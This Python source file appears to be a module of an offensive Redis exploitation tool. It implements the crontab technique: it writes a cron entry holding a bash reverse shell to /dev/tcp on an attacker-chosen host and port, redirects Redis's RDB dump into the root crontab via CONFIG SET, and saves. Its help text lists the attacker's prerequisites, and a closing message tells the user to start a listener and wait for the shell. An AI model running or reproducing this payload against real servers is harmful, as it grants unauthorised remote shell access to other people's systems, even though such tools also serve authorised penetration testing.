from redis.exceptions import ResponseError
from .utils import do_post_attack_restoration
from .common import get_assume_defaults_value



def crontab_help():
    return "\nUse this technique to gain a shell session by creating a cronjob\n" \
    "using the RDB file save technique.\n\n" \
    "Some important points to note here would be:\n" \
    "1. The attacker MUST have permissions to issue the following commands:\n" \
    "    i. SET\n" \
    "   ii. CONFIG SET\n" \
    "  iii. SAVE\n" \
    "   iv. FLUSHALL (or FLUSHDB)\n" \
    "2. The crontab file permissions must be right\n" \
    "3. The file format must be correct (for Debian-based distros)\n" \
    "4. The user running redis-server must have permissions to write\n" \
    "to the crontabs folder!\n" \
    "5. It must be implied but stating for completeness - cron service\n" \
    "must be running on the target server.\n\n" \
    "Third condition is hard to meet as the RDB file contains it's own\n" \
    "header. Therefore, this attack doesn't work against Debian-based\n" \
    "distros.\n"



def crontab(pipeline, dir):

    lhost = "127.0.0.1"
    lport = 4444

    assume_defaults = get_assume_defaults_value()

    if not assume_defaults:
        lhost = input("\nLHOST (default='127.0.0.1'): ") or lhost
        lport = input("LPORT (default=4444): ") or lport

    payload = f"\n\n*/1 * * * * /bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\n\n"

    cron_dir = "/var/spool/cron/crontabs/"

    if not assume_defaults:
        cron_dir = input("\nProvide cron directory (default='/var/spool/cron/crontabs/'): ") or cron_dir

    pipeline.set("cron_job", payload)

    pipeline.config_set("dir", cron_dir)
    pipeline.config_set("dbfilename", "root")
    pipeline.save()

    try:
        pipeline.execute()
    except ResponseError as e:
        print ("\n[-] Error:", str(e), "\n")
        print (f"Most probably the permissions to write to the current config dir ('{dir}') are missing!\n")

        print("Couldn't save the cron job.\n")

        do_post_attack_restoration(pipeline, "cron_job", dir)

        return

    do_post_attack_restoration(pipeline, "cron_job", dir)

    print (f"\nSetup a listener on port {lport} on machine {lhost} and\nyou should get a shell in a minute or so :)\n")
    print ("[WARNING] If it's a Debian machine, there would be a problem\nwith the dump file permissions and the corrupted crontab file!\nSo it won't work :/\n")